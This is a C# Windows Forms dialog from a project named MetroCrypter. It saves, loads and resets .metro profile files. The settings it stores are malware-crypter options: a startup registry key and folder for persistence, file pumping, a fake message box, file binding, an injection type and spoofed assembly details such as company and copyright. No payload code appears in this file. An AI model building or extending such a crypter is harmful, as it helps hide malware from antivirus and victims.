using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using static MetroCrypter.Form1;
using System.IO;

namespace MetroCrypter.Forms
{   


    public partial class ProfileDialog : Form
    {
        public ProfileDialog()
        {
            InitializeComponent();
        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST)
                m.Result = (IntPtr)(HT_CAPTION);
        }

        private const int WM_NCHITTEST = 0x84;
        private const int HT_CLIENT = 0x1;
        private const int HT_CAPTION = 0x2;

        private void OptionsStartup_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button3_Click(object sender, EventArgs e)
        {

            



            saveFileDialog1.Filter = "Config File|*.metro";
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    TextWriter tw = new StreamWriter(saveFileDialog1.FileName);

                     //////////////////////// <bool> ///////////////////////
                    tw.WriteLine(CID.PDreply.ToString());
                    tw.WriteLine(CID.startupreply.ToString());
                    tw.WriteLine(CID.fpreply.ToString());
                    tw.WriteLine(CID.fmreply.ToString());
                    tw.WriteLine(CID.tmreply.ToString());
                    //////////////////////// </bool> ///////////////////////
                    //////////////////////// <assembly> ////////////////////
                    tw.WriteLine(CID.title);
                    tw.WriteLine(CID.description);    
                    tw.WriteLine(CID.company);
                    tw.WriteLine(CID.product);     
                    tw.WriteLine(CID.version);  
                    tw.WriteLine(CID.copyright);
                    tw.WriteLine(CID.trademark);  
                    //////////////////////// </assembly> ///////////////////
                    // <options>
                    tw.WriteLine(CID.filename);
                    tw.WriteLine(CID.iconame);
                    // </options>
                         
                              // <startup>
                              tw.WriteLine(CID.FolderName);
                              tw.WriteLine(CID.Sfilename);
                              tw.WriteLine(CID.RegistKey);
                              // </startup>

                              // <pump>
                              tw.WriteLine(CID.txtPump);
                              // </pump>

                              // <fakemessage>
                              tw.WriteLine(CID.Title);
                              tw.WriteLine(CID.Message);
                              // </fakemessage>
                              tw.WriteLine(CID.delay);
                              tw.WriteLine(CID.binding);
                              tw.WriteLine(CID.BindReply);
                              tw.WriteLine(CID.ijtype);
                              tw.WriteLine(CID.fversion);


                tw.Close();
                    MessageBox.Show("Saved to " + saveFileDialog1.FileName, "Saved Log File", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "Config File|*.metro";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                
                string filepath = openFileDialog1.FileName;
                string[] lines = System.IO.File.ReadAllLines(filepath);
                if (openFileDialog1.FileName.Contains(".metro")== false)
                {
                    MessageBox.Show("Error unreadable file \nPlease insert a .metro file");
                }

                else
                {
                    CID.PDreply = Convert.ToBoolean(lines[0]);
                    CID.startupreply = Convert.ToBoolean(lines[1]);
                    CID.fpreply = Convert.ToBoolean(lines[2]);
                    CID.fmreply = Convert.ToBoolean(lines[3]);
                    CID.tmreply = Convert.ToBoolean(lines[4]);
                    //// <assembly>
                    CID.title = lines[5];
                    CID.description = lines[6];
                    CID.company = lines[7];
                    CID.product = lines[8];
                    CID.version = lines[9];
                    CID.copyright = lines[10];
                    CID.trademark = lines[11];
                    //// </assembly>
                    //// <options>
                    CID.filename = lines[12];
                    CID.iconame = lines[13];
                    //// </options>
                    //// <startup>
                    CID.FolderName = lines[14];
                    CID.Sfilename = lines[15];
                    CID.RegistKey = lines[16];
                    //// </startup>
                    //// <pump>
                    CID.txtPump = lines[17];
                    //// </pump>
                    //// <fakemessage>
                    CID.Title = lines[18];
                    CID.Message = lines[19];

                    //// </fakemessage>
                    CID.delay = lines[20];
                    CID.binding = lines[21];
                    CID.BindReply = Convert.ToBoolean(lines[22]);
                    CID.ijtype = lines[23];
                    CID.fversion = lines[24];
                }
            
            }

            if(openFileDialog1.FileName.Contains(".metro") == false)
            {
               
            }
            else
            {
                MessageBox.Show("Loaded " + openFileDialog1.FileName + " Succesfully", "Loaded File", MessageBoxButtons.OK, MessageBoxIcon.Information);
                this.Close();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            CID.PDreply = false;
            CID.startupreply = false;
            CID.fpreply = false;
            CID.fmreply = false;
            CID.tmreply = false;
            CID.BindReply = false;
            //// <assembly>
            CID.title = null;
            CID.description = null;
            CID.company = null;
            CID.product = null;
            CID.version = null;
            CID.copyright = null;
            CID.trademark = null;
            //// </assembly>
            //// <options>
            CID.filename = null; 
            CID.iconame = null;
            //// </options>
            //// <startup>
            CID.FolderName = null;
            CID.Sfilename = null;
            CID.RegistKey = null;
            //// </startup>
            //// <pump>
            CID.txtPump = null;
            //// </pump>
            //// <fakemessage>
            CID.Title = null;
            CID.Message = null;

            //// </fakemessage>
            CID.delay = null;
            CID.binding = null;
           
            CID.ijtype = null;
            CID.fversion = null;
            MessageBox.Show("Cleared Settings");
        }
    }
}

